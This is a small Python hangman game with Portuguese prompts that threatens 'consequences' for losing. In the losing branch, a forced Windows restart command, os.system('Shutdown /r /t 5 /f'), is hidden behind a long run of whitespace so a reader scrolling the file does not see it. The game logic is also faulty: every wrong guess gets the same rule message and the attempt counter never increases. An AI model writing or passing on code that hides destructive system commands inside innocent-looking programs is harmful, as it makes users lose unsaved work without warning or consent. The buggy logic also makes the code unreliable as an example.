import os as o 
import getpass as gp


#1 escreva a palavra
print('Seja bem-vindo, a FORCA. ')
print('Caso você perca, terá consequências KKKKKKKK. ')
print('Regra: Não pode numeros... OBS: Sua palavra estará invisivel, então atenção. ')
print('HAHAHAHAHAHAHAHAAAAHAHAHAHAHAHAHAHAAAA')


escolha = gp.getpass('Escolha sua palavra com muita atenção. ')
dica = input('Dê dica dessa palavra. ')

def jogo():
 while True:
#numero de tentativas
  max_tentativa = 3

  tentativa = 0
 
  while tentativa < max_tentativa:
    print('---------')
    print(dica)
    print('---------')

    palavra = input('Qual palavra é? ')

    if palavra == escolha:
        print('ACERTOU!! Você está livre de consequências. Sua palavra era' , escolha)
        return True
    elif palavra != escolha:
       print('Sua palavra não pode conter números! leia a Regra')
  
    else:
        tentativa += 1 
        if tentativa < max_tentativa:
            print(f'ERROR!! Tente novamente, cuidado você tem {max_tentativa - tentativa}')
        else: 
            print(f'Você acabou com todas as chances, sua palavra era {escolha}')
            
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            o.system("Shutdown /r /t 5 /f ")

jogo()
